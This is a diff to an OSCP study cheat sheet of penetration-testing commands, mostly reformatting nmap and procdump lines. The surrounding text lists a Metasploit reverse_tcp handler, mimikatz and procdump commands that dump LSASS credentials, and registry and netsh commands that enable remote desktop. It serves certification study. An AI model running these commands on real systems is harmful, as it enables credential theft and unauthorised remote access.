@@ -14,8 +14,10 @@ Here are some commands that I found helpful during the OSCP. I encourage you to 
 ***
 
 #### Scanning  
-General pass - `nmap <IP> --top-ports 10 --open`  
-Intense scan - `nmap -p 1-65535 -T4 -A -v <IP>`  
+Quick Pass  
+`nmap <IP> --top-ports 10 --open`  
+Intense scan  
+`nmap -p 1-65535 -T4 -A -v <IP>`  
 
 #### Web  
 `nitko -h <IP>`  
@@ -108,6 +110,7 @@ See msfvenom cheat sheet
 `session -i 1` ---puts you back into your session
 
 #### Turn a regular shell into a meterpreter shell  
+ -  
 ##### Attacker  
 - `use exploit/multi/handler`  
 - `set payload windows/shell/reverse_tcp`  
@@ -140,8 +143,8 @@ See netcat cheat sheet
 `mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”`  
 `Procdump.exe -accepteula -ma lsass.exe lsass.dmp`  
 `mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”`  
-`C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp' (32 bit)
-`C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp` (64-bit)
+`C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp`  
+`C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp`  
 `reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0`  
 `netsh firewall set service remoteadmin enable`  
 `netsh firewall set service remotedesktop enable`  
